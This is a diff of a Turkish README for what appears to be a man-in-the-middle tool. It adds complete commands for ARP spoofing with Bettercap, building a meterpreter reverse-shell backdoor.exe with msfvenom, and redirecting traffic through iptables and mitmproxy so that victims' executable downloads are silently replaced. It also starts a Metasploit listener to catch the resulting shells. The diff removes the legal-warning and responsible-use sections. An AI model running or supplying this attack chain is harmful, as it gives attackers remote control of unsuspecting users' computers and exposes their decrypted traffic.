@@ -8,17 +8,61 @@ Bu araç, **siber güvenlik uzmanlarına** ve **etik hacker'lara** yönelik geli
 - Gerçekçi penetrasyon test senaryoları oluşturma
 
 ## 🛠️ **Nasıl Çalışır?**
-1. **Ağ Dinleme**: 
-   - Bettercap ile yerel ağdaki cihazlar tespit edilir
-     
-2. **ARP Manipülasyonu**:
-   - Hedef cihazın trafiği sizin üzerinize yönlendirilir
+İşte **MITM saldırısıyla EXE yönlendirme** için gereken tüm adımlar ve komutlar:
 
-3. **Backdoor Yerleştirme**:
-   - Msfvenom ile oluşturulan özel backdoor
+---
 
-4. **Yönlendirme Mekanizması**:
-   - Mitmproxy, `.exe` isteklerini otomatik olarak backdoor'a yönlendirir
+### 🔧 **1. Hazırlık Aşaması**
+```bash
+# Gerekliliklerin kurulumu (Kali Linux)
+sudo apt update && sudo apt install -y mitmproxy bettercap metasploit-framework python3
+```
+
+### 🌐 **2. Ağ Dinleme Başlatma**
+```bash
+# Ağ arayüzünü belirleme (örnek: wlan0)
+sudo bettercap -iface wlan0
+```
+
+### 🕵️♂️ **3. ARP Spoofing Aktivasyonu**
+```bettercap
+# Bettercap içinde çalıştırılacak komutlar
+net.probe on
+set arp.spoof.targets ***  # Hedef IP
+set arp.spoof.fullduplex true
+arp.spoof on
+```
+
+### 🎯 **4. Backdoor Oluşturma**
+```bash
+# Meterpreter payload üretimi
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=Hedep IP LPORT=1234 -f exe -o /var/www/html/backdoor.exe
+```
+
+### 🚦 **5. Trafik Yönlendirme Kuralları**
+```bash
+# IP Tables ayarları
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+```
+
+### ⚡ **6. MITM Proxy Başlatma**
+```bash
+./mitmdump -s mitm.py --mode transparent
+```
+
+### 📡 **7. Metasploit Dinleyici**
+```bash
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ***; set LPORT 1234; exploit"
+```
+
+### 📌 **Önemli Notlar**
+1. **IP Adresleri** kendi ağınıza göre değiştirilmeli
+2. Sertifika hatası almamak için hedef cihazda `mitm.it`'den CA sertifikası yüklenmeli
+3. Testler sadece **yasal ortamlarda** yapılmalıdır
+
+---
+
+Bu komutlar **Kali Linux 2023+** sürümlerinde test edilmiştir. Her adımın çıktılarını kontrol ederek ilerleyin! 💻
 
 ## 🌟 **Öne Çıkan Özellikler**
 | Özellik | Açıklama |
@@ -26,12 +70,6 @@ Bu araç, **siber güvenlik uzmanlarına** ve **etik hacker'lara** yönelik geli
 | **Görünmez Yönlendirme** | Kullanıcılar orijinal dosyayı indirdiğini sanar |
 | **SSL Bypass** | Mitm.it sertifikasıyla şifreli trafik çözülür |
 | **Çoklu Hedef** | Tüm ağ veya tek cihaz seçilebilir |
-
-## ⚠️ **Yasal Uyarı**
-Bu araç **sadece**:
-- Yetkili güvenlik testlerinde
-- Kendi ağınızda
-- Yazılı izinle kullanılabilir
 
 **Örnek Kullanım Senaryoları**:
 - Kurumsal ağ güvenlik testleri
@@ -44,9 +82,6 @@ Bu araç **sadece**:
 - Güvenlik uzmanlarının **savunma mekanizmaları** geliştirmesine yardımcı olur
 
 ---
-
-### 📌 **Son Not**
-Bu proje **Kali Linux** ve **Python 3** ortamında geliştirilmiştir. Tüm testler kontrollü laboratuvar ortamında yapılmıştır. Lütfen **sorumlu kullanım** ilkelerine uyunuz.
 
 > "Bilgi güvenliği, savunma ve saldırı dinamiklerini anlamakla başlar." - Siber Güvenlik Manifestosu
 
